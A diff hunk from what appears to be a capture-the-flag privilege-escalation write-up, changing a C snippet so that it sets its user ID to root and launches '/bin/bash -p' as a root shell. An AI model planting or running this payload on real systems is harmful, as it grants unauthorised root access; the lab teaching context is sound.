@@ -307,10 +307,9 @@ Go there (for example, /tmp) and create this:
 ```
 #include <unistd.h>
 
-void main() {
-    setgid(0);
-    setuid(0);
-    system("thm");
+int main() {
+	setuid(0);
+	system("/bin/bash -p");
 }
 ```
 
